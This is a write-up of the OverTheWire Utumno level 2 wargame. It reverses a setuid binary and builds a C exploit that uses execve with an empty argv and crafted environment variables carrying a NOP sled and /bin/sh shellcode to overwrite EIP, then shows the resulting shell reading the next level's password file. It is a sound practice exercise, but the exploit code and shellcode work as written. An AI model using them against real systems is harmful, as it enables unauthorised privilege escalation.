---
layout: post
title: OverTheWire - Utumno2
---

Site: http://overthewire.org/wargames/utumno/ <br>
Level: 2<br>
Situation: ASM Reading Exercise<br><br>

SideNote: This write up is condensed there was a lot of small repetitive steps that had been done in previous examples and explained.

As we usually do we are going to create a temp directory for our use. Then we are going to get the file archtype and the basic output.

{% highlight bash %}
utumno2@melinda:~$ mkdir /tmp/ut2
utumno2@melinda:~$ cd /tmp/ut2
utumno2@melinda:/tmp/ut2$ 
{% endhighlight %}

{% highlight bash %}
utumno2@melinda:/tmp/ut2$ file /utumno/utumno2
/utumno/utumno2: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
BuildID[sha1]=8557fab8b28ac610dff835c3fbfa7b02bd54a2de, not stripped
{% endhighlight %}

{% highlight bash %}
utumno2@melinda:/tmp/ut2$ /utumno/utumno2
Aw..
{% endhighlight %}

The usual nothing to explanatory. Let’s go ahead and ltrace.

{% highlight bash %}
utumno2@melinda:/tmp/ut2$ ltrace /utumno/utumno2
__libc_start_main(0x804845d, 1, 0xffffd794, 0x80484b0 <unfinished ...>
puts("Aw.."Aw..
)                                     = 5
exit(1 <no return ...>
+++ exited (status 1) +++
{% endhighlight %}

Nothing again. If we pass an argument to it we get the same issue.

{% highlight bash %}
utumno2@melinda:/tmp/ut2$ ltrace /utumno/utumno2 asdf
__libc_start_main(0x804845d, 1, 0xffffd794, 0x80484b0 <unfinished ...>
puts("Aw.."Aw..
)                                     = 5
exit(1 <no return ...>
+++ exited (status 1) +++
{% endhighlight %}

We open in it in our disassembler and get a control flow graph to see what is going on.

![Embeded](/images/utumno/utumno2/callgraph1.png)
[FullSize](/images/utumno/utumno2/callgraph1.png)

Short and easy to understand lets go ahead and mark it up.

![Embeded](/images/utumno/utumno2/callgraph2.png)
[FullSize](/images/utumno/utumno2/callgraph2.png)

Simple enough to understand. We know in order to get past the "AW" message we have to get past the argc check. By default all c applications get passed in their name in argv[0] which means argc is going to at least contain 1. So in order to do this we need to execute the application from another application that allows us to control the arguments going into the application.

We can use execve to do this. The definition of execve:

int execve(const char *filename, char *const argv[], char *const envp[]);

So our code will start as the following.

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {

    char *arg[] = { 0x0 };
    char *envp[] = { };
    execve("/utumno/utumno2", arg, envp);
    perror("execve");
    exit(1);
}

{% endhighlight %}

When we run this and we get past the initial block. But takes us into a segfault. For ease of use we are going to upload our invoker.sh script that we previously used. For debugging. Looking at the ASM we know that it is trying to access the address of argv[1] however we are passing in 0 arguments to get past the first check. Looking at execve we are giving a third parameter to pass in environment variables. Now let’s look at our stack to see the position of these variables.

![Embeded](/images/utumno/utumno2/stack.png)

[FullSize](/images/utumno/utumno2/stack.png) [Source](http://www.dreamincode.net/forums/topic/285550-nasm-linux-getting-command-line-parameters/)

We can push a specific amount of environmental variables to make our argv[1] point to one of our environmental variables.

{% highlight bash %}
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {

    char *arg[] = { 0x0 };
    char *envp[] = {  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAA" };
    execve("/utumno/utumno2", arg, envp);
    perror("execve");
    exit(1);
}
{% endhighlight %}

The first one didn't work so we change to the second variable.

{% highlight bash %}
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {

    char *arg[] = { 0x0 };
    char *envp[] = { "", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAA" };
    execve("/utumno/utumno2", arg, envp);
    perror("execve");
    exit(1);
}
{% endhighlight %}

Each step of the way using our invoker shell to check GDB to see if we are affecting the EIP in anyway. We continue down the line till we hit a crash when using our "A"'s indicated we are controlling EIP.

The magic number is 9 in this case. Then turns our code into.

{% highlight bash %}
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {

    char *arg[] = { 0x0 };
    char *envp[] = {
     	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
	NULL
    };
    execve("/utumno/utumno2", arg, envp);
    perror("execve");
    exit(1);
}
{% endhighlight %}

At this point it turns into a simple stack overflow.

To find the exact length required we utilize metasploit's pattern_create.rb and pattern_offset.rb tool. Which returns that our number is 24. We know that we are able to store shell code and a nopsled in it. However when we attempted to find the nopseld we were unable to find a matched pattern.

To overcome this we utilize the environmental variable before the A's to store our nopseld and shell code. We reuse our 21 byte bin/sh shell code.

{% highlight bash %}
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
{% endhighlight %}

We also add a fair bit of nops in front of it turning our code into the following.

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {

    char *arg[] = { 0x0 };
    char *envp[] = { 
     	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
         \x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f
        \x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80",
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
	NULL


    };
    execve("/utumno/utumno2", arg, envp);
    perror("execve");
    exit(1);
}

{% endhighlight %}

Finally we just need to find the address of our nopseld using the command "find $esp, $esp+400, 0x90909090" in GDB. Giving us the address 0xffffdf9d. We add the address to the new code.

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {

    char *arg[] = { 0x0 };
    char *envp[] = { 
     	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
         \x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f
        \x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80",
	"AAAAAAAAAAAAAAAAAAAAAAAA\x9d\xdf\xff\xff",
	NULL


    };
    execve("/utumno/utumno2", arg, envp);
    perror("execve");
    exit(1);
}

{% endhighlight %}

We run it in userspace and we get the following.

{% highlight bash %}
utumno2@melinda:/tmp/ut2$ ./a.out 
$ whoami
utumno3
$ cat /etc/utumno_pass/utumno3
[OMITTED]
{% endhighlight %}

There is our password.